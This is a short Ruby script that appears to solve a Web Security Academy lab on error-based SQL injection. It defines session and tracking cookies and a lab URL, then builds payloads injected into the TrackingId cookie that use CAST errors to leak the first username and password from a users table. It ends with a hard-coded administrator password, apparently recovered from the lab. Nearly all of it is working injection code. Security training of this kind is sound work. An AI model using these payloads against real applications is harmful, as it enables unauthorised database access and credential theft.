require_relative '../utils.rb'

SESSION_COOKIE = "pGO69UseqMyIZgzFFcj81Rah6Mq4CPgN"
TRACKINGID_COOKIE = "XN5BKqu9TbudjX2A"
BASE_URI = URI("https://0ae400750492996c81ef2a96002800f7.web-security-academy.net/")

# SQL error is exposed in error message in http response, below exposes the SELECT within the error mssg
username_sql = "#{TRACKINGID_COOKIE}' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--"
password_sql = "#{TRACKINGID_COOKIE}' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--"

correct_admin_password = "b1wfv66p1fy9enje598e"